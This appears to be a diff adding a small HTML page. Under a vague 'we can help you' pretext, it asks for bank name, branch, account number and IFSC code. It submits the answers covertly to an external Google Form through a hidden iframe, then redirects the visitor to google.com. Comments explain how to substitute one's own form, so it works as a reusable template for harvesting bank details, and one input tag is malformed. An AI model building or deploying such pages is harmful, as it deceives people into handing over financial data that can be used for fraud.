@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>HTML Form</title>
+<!-- CSS -->
+<style>
+	*{
+		margin: 0;
+		padding: 0;
+		font-family: sans-serif;
+	}
+	body{
+		margin: 25px 55px;
+	}
+	.myform input{
+		padding: 10px 15px;
+		font-size: 16px;
+		margin: 5px 0px;
+	}
+	</style>
+</head>
+<body>
+<!-- Static- Please don't do anything here-->
+<script type="text/javascript">var submitted=false;</script>
+<iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='https://www.google.com/';}"></iframe>
+<!--My Form-->
+<h1>Please give your details so <br/> that we can help you🙂</h1>
+
+
+<br />
+
+<!-- FORM 
+1. Replace # of form action with your google form s url
+2. Replace # of name with entry code.
+
+Note : Now a days google forms entry codes are not availabe on source so for that kindly generate a pre-filled link in order to get the entry codes.
+-->
+<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeGHpUJPKenyirAUnkwnk1Q0DBwvOIG-tlpHScDIVIcZJ3spg/formResponse" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+	<input type="text" placeholder="Name of the bank" name="entry.2039316149"><br/>
+	<input type="text" placeholder="Branch" name="entry.1376111823"><br/>
+	<input type="text" placeholder="City" name="entry.1114495512"><br/>
+    <input type="text" placeholder="State" name="entry.225063809"
+	<input type="text" placeholder="Bank Account number" name="entry.117224992"><br/>
+	<input type="text" placeholder="IFSC code" name="entry.1192720809"><br/>
+	<input type="submit" value="Submit">
+</form>
+
+<!--ABOUT CT-->
+<br>
+<br>
+</p>
+</body>
+</html>
